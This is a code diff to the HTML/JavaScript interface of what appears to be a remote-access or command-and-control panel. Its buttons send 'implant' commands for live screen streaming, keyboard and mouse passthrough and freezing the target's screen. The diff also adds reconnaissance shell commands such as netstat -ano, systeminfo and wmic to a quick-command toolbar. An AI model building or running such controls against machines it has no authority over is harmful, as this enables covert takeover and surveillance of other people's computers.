@@ -290,7 +290,6 @@
         <div class="content-panel" id="panel">
             <div id="contentInject" style="flex:1;display:flex;flex-direction:column;overflow:hidden;"></div>
             <div class="footer">
-                <span id="footer-time"></span>
                 <div class="footer-dot"></div>
                 <span id="footer-status">Idle</span>
                 <div style="margin-left:auto; display:flex; align-items:center;">
@@ -1066,9 +1065,9 @@
                             <div class="wv-toolbar">
                                 <span class="wv-toolbar-title">Options</span>
                                 <div class="wv-sep"></div>
-                                <button id="btn-toggle-stream" class="tool-btn button" style="width:auto; min-width:100px; padding: 7px 12px;" onclick="toggleStream()"><i class="ph ph-play" style="margin-right:6px"></i></button>
-                                <div class="tool-btn" onclick="sendImplantCmd('key_passthrough_on')"><i class="ph ph-keyboard"></i><span class="tip">Enable Keyboard Passthrough</span></div>
-                                <div class="tool-btn" onclick="sendImplantCmd('mouse_passthrough_on')"><i class="ph ph-mouse"></i><span class="tip">Enable Mouse Passthrough</span></div>
+                                <div class="tool-btn" id="btn-toggle-stream" onclick="toggleStream()"><i class="ph ph-play"></i><span class="tip">Toggle Stream</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('key_passthrough_on')"><i class="ph ph-keyboard"></i><span class="tip">Toggle Keyboard Passthrough</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('mouse_passthrough_on')"><i class="ph ph-mouse"></i><span class="tip">Toggle Mouse Passthrough</span></div>
                                 <div class="tool-btn" onclick="sendImplantCmd('screen_freeze')"><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze Screen</span></div>
                                 <div class="tool-btn" onclick="sendImplantCmd('screen_unfreeze')"><i class="fa-solid fa-droplet"></i><span class="tip">Thaw Screen</span></div>
                                 <div class="wv-sep"></div>
@@ -1087,9 +1086,12 @@
                                 <span class="wv-toolbar-title">Quick Commands</span>
                                 <div class="wv-sep"></div>
                                 <div class="tool-btn" onclick="sendTermFromButton('whoami')"><i class="ph ph-user"></i><span class="tip">Whoami</span></div>
-                                <div class="tool-btn" onclick="sendTermFromButton('ipconfig /all || ifconfig')"><i class="ph ph-network"></i><span class="tip">Network Config</span></div>
                                 <div class="tool-btn" onclick="sendTermFromButton('hostname')"><i class="ph ph-identification-card"></i><span class="tip">Hostname</span></div>
-                                <div class="tool-btn" onclick="sendTermFromButton('cat /etc/os-release || ver')"><i class="ph ph-info"></i><span class="tip">OS Info</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('ipconfig /all || ifconfig')"><i class="ph ph-network"></i><span class="tip">Network Config</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('netstat -ano')"><i class="ph ph-plugs-connected"></i><span class="tip">Connections</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('systeminfo')"><i class="ph ph-info"></i><span class="tip">OS Info</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('wmic logicaldisk get name,freespace,size')"><i class="ph ph-hard-drives"></i><span class="tip">Disk Space</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('net stats workstation')"><i class="ph ph-clock"></i><span class="tip">Uptime</span></div>
                             </div>
                         `}
                     ]},
@@ -1344,7 +1346,7 @@
                     sendImplantCmd('screen_stop');
                     isStreaming = false;
                     const btnStream = document.getElementById('btn-toggle-stream');
-                    if (btnStream) btnStream.innerHTML = '<i class="ph ph-play" style="margin-right:6px"></i>';
+                    if (btnStream) btnStream.innerHTML = '<i class="ph ph-play"></i>';
                     const lsImg = document.getElementById('live-screen-img');
                     if (lsImg) lsImg.style.display = 'none';
                     const lsIco = document.getElementById('live-screen-icon');
